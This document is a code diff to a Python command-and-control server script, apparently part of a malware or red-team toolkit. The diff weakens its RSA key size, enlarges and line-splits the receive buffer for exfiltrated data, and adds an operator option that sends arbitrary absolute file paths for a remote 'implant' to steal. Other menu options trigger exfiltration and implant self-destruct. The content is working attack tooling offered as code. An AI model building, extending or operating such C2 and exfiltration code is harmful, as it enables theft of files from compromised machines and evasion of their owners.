@@ -6,7 +6,7 @@ import rsa
 
 
 #generate the rsa key used by C2
-(pubkey, privkey) = rsa.newkeys(2048)
+(pubkey, privkey) = rsa.newkeys(1024)
 
 # Create a TCP/IP socket
 c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,15 +26,19 @@ print('########################################################')
 
 def recieve_exfil():
     # Wait for a connection
-    print("waiting for a connection")
+    print("Waiting for a Connection...")
     connection, client_address = c2_socket.accept()
     try:
         #Recieves and prints the data
         while True:
             #encrypted
-            data = connection.recv(100)
+            data = connection.recv(500)
             if data:
-                print(data)
+                content = data.decode("utf-8")
+                lines = content.split("\n")
+                for l in lines:
+                    if(l != ""):
+                        print(l)
             else:
                 print("----------------")
                 break
@@ -65,23 +69,26 @@ while(True):
         print(f"{Fore.RED}Self-destruct complete")
         exit()
 
-    elif choice == '2':
-        print("Exfil initiated")
-        
+    elif choice == '2':       
         #Listen for the Responses
         c2_socket.listen(1)
-        exfil = True
-        while(exfil == True):
-            #Send command to exfiltrate
-
-            #encrypt command, send with public key
-            send_implant('2')
-            #Recieve the exfil and decrypt the response
-            recieve_exfil()
-            print("Press n to end: any other key to continue")
+        while(True):
+            print("Press 'n' to end, 'a' to add an exfil path, any other key to continue")
             c = input(">>")
             if(c == 'n'):
                 break
+            elif(c == 'a'):
+                print("Enter the absolute path to the file to add")
+                path = input(">>")
+                send_implant('2a' + ";" + path)
+            else:
+                print("Exfil initiated")
+                #Send command to exfiltrate
+                #encrypt command, send with public key
+                send_implant('2e')
+                #Recieve the exfil and decrypt the response
+                recieve_exfil()
+            
             
     elif choice == '3' or choice == 'q' or choice == 'exit' or choice == 'Exit' or choice == 'quit':
         print("Exiting the C2 instance")
